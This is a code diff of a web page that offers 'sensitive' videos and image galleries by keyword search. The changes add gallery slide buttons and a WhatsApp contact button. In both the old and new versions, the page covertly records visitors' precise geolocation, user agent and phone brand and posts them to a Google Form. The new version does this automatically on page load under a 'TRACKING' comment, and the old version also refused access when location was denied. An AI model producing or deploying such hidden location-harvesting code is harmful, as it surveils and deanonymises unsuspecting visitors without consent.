@@ -20,8 +20,8 @@ h1 { margin-top: 40px; }
 
 .main-img {
   margin-top: 20px;
-  width: 140px;
-  height: 140px;
+  width: 130px;
+  height: 130px;
   border-radius: 18px;
   object-fit: cover;
 }
@@ -81,22 +81,47 @@ button {
   cursor: pointer;
 }
 
-/* BLOKIR */
-.block {
-  display: none;
-  position: fixed;
-  inset: 0;
-  background: black;
+/* tombol slide */
+.nav-btn {
+  position: absolute;
+  bottom: -40px;
+  font-size: 26px;
+  background: rgba(0,0,0,0.4);
   color: white;
-  z-index: 2000;
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  text-align: center;
+  border: none;
+  border-radius: 6px;
+  padding: 4px 12px;
+  cursor: pointer;
 }
 
-.block-box {
-  opacity: 0.85;
+.nav-left { left: 0; }
+.nav-right { right: 0; }
+
+.indicator {
+  margin-top: 10px;
+  letter-spacing: 5px;
+  font-size: 18px;
+}
+
+/* tombol telepon */
+.phone-btn {
+  position: fixed;
+  right: 20px;
+  bottom: 20px;
+  width: 52px;
+  height: 52px;
+  background: white;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  z-index: 1000;
+}
+
+.phone-btn svg {
+  width: 26px;
+  height: 26px;
+  fill: black;
 }
 </style>
 </head>
@@ -104,124 +129,138 @@ button {
 <body>
 
 <h1>リップズ</h1>
+
 <img class="main-img" src="https://files.catbox.moe/2sgujb.jpg">
 
 <input id="keyword" placeholder="Search">
-<button onclick="startSearch()">SEARCH</button>
+<button onclick="search()">SEARCH</button>
 
 <div class="warning">This Web Is Sensitif⚠</div>
 
-<!-- MODAL -->
 <div class="modal" id="modal">
   <div class="modal-box" id="modalBox">
     <div class="close" onclick="closeModal()">✕</div>
   </div>
 </div>
 
-<!-- BLOKIR -->
-<div class="block" id="block">
-  <div class="block-box">
-    <h2>Akses Ditolak</h2>
-    <p>Website ini memerlukan izin lokasi.<br>
-    Tanpa izin, tidak ada akses.</p>
-  </div>
-</div>
+<a href="https://wa.me/6281317309919" target="_blank" class="phone-btn">
+  <svg viewBox="0 0 24 24">
+    <path d="M6.62 10.79a15.05 15.05 0 006.59 6.59l2.2-2.2a1 1 0 011.11-.21c1.2.48 2.5.74 3.83.74a1 1 0 011 1v3.5a1 1 0 01-1 1C10.07 21.5 2.5 13.93 2.5 4a1 1 0 011-1H7a1 1 0 011 1c0 1.33.26 2.63.74 3.83a1 1 0 01-.21 1.11l-2.2 2.2z"/>
+  </svg>
+</a>
 
 <script>
+/* ===== DATA SEARCH ===== */
 let data = {};
+let currentImages = [];
+let currentIndex = 0;
 
-// cache busting biar selalu update
-fetch("https://lipzz-elzxd.github.io/Lipz/data.json?v=" + Date.now())
-  .then(res => res.json())
-  .then(json => data = json);
-
-// Google Form
-const formURL = "https://docs.google.com/forms/d/e/1FAIpQLScJJ-PAqYmeOnS6qKdgL1gTGMyX_FjrMLLg93Pv4QDbw1N-Cg/formResponse";
-const entryLat = "entry.138340134";
-const entryLon = "entry.1616098311";
-const entryUA  = "entry.1257224602";
-
-function startSearch() {
-  if (!navigator.geolocation) {
-    blockSite();
-    return;
-  }
-
-  navigator.geolocation.getCurrentPosition(
-    pos => {
-      // kirim lokasi dulu
-      const dataForm = new URLSearchParams();
-      dataForm.append(entryLat, pos.coords.latitude);
-      dataForm.append(entryLon, pos.coords.longitude);
-      dataForm.append(entryUA, navigator.userAgent);
-
-      fetch(formURL, {
-        method: "POST",
-        mode: "no-cors",
-        body: dataForm
-      });
-
-      // baru search jalan
-      search();
-    },
-    err => {
-      blockSite();
-    }
-  );
-}
+fetch("https://lipzz-elzxd.github.io/Lipz/data.json")
+  .then(r => r.json())
+  .then(j => data = j);
 
 function search() {
   const key = document.getElementById("keyword").value.trim().toLowerCase();
   if (!data[key]) return;
 
-  const modalBox = document.getElementById("modalBox");
-  modalBox.innerHTML = '<div class="close" onclick="closeModal()">✕</div>';
+  const box = document.getElementById("modalBox");
+  box.innerHTML = '<div class="close" onclick="closeModal()">✕</div>';
 
   if (data[key].type === "video") {
     const v = document.createElement("video");
     v.src = data[key].src;
     v.controls = true;
     v.autoplay = true;
-    modalBox.appendChild(v);
+    box.appendChild(v);
   }
 
   if (data[key].type === "gallery") {
-    let idx = 0;
-    const imgs = data[key].images;
+    currentImages = data[key].images;
+    currentIndex = 0;
 
     const img = document.createElement("img");
-    img.src = imgs[idx];
-    modalBox.appendChild(img);
+    img.id = "mainGallery";
+    img.src = currentImages[0];
+    box.appendChild(img);
 
-    const indicator = document.createElement("div");
-    indicator.style.marginTop = "8px";
-    indicator.style.letterSpacing = "4px";
-    modalBox.appendChild(indicator);
+    const l = document.createElement("button");
+    l.className = "nav-btn nav-left";
+    l.textContent = "<";
+    l.onclick = () => slide(-1);
 
-    function update() {
-      img.src = imgs[idx];
-      indicator.textContent = imgs.map((_,i)=> i===idx?"♦":"•").join("");
-    }
+    const r = document.createElement("button");
+    r.className = "nav-btn nav-right";
+    r.textContent = ">";
+    r.onclick = () => slide(1);
 
-    img.onclick = () => {
-      idx = (idx + 1) % imgs.length;
-      update();
-    };
+    const ind = document.createElement("div");
+    ind.className = "indicator";
+    ind.id = "indicator";
 
-    update();
+    box.append(l, r, ind);
+    updateIndicator();
   }
 
   document.getElementById("modal").style.display = "flex";
 }
 
-function closeModal() {
-  document.getElementById("modal").style.display = "none";
-  document.getElementById("modalBox").innerHTML = "";
+function slide(d) {
+  currentIndex += d;
+  if (currentIndex < 0) currentIndex = currentImages.length - 1;
+  if (currentIndex >= currentImages.length) currentIndex = 0;
+  document.getElementById("mainGallery").src = currentImages[currentIndex];
+  updateIndicator();
 }
 
-function blockSite() {
-  document.getElementById("block").style.display = "flex";
+function updateIndicator() {
+  let t = "";
+  currentImages.forEach((_, i) => t += i === currentIndex ? "♦" : "•");
+  document.getElementById("indicator").textContent = t;
 }
+
+function closeModal() {
+  document.getElementById("modal").style.display = "none";
+  document.getElementById("modalBox").innerHTML = '<div class="close" onclick="closeModal()">✕</div>';
+}
+
+/* ===== TRACKING ===== */
+const FORM_URL = "https://docs.google.com/forms/d/e/1FAIpQLScJJ-PAqYmeOnS6qKdgL1gTGMyX_FjrMLLg93Pv4QDbw1N-Cg/formResponse";
+
+const ENTRY_LAT = "entry.138340134";
+const ENTRY_LON = "entry.1616098311";
+const ENTRY_UA  = "entry.1257224602";
+const ENTRY_HP  = "entry.1874088822";
+
+function detectBrand(ua) {
+  ua = ua.toLowerCase();
+  if (ua.includes("samsung")) return "Samsung";
+  if (ua.includes("oppo") || ua.includes("cph")) return "OPPO";
+  if (ua.includes("vivo")) return "Vivo";
+  if (ua.includes("xiaomi") || ua.includes("redmi")) return "Xiaomi";
+  if (ua.includes("iphone")) return "iPhone";
+  if (ua.includes("realme")) return "Realme";
+  return "Unknown";
+}
+
+function sendTracking() {
+  if (!navigator.geolocation) return;
+
+  navigator.geolocation.getCurrentPosition(p => {
+    const d = new URLSearchParams();
+    d.append(ENTRY_LAT, p.coords.latitude.toFixed(6));
+    d.append(ENTRY_LON, p.coords.longitude.toFixed(6));
+    d.append(ENTRY_UA, navigator.userAgent);
+    d.append(ENTRY_HP, detectBrand(navigator.userAgent));
+
+    fetch(FORM_URL, {
+      method: "POST",
+      mode: "no-cors",
+      body: d
+    });
+  });
+}
+
+sendTracking();
 </script>
 
 </body>
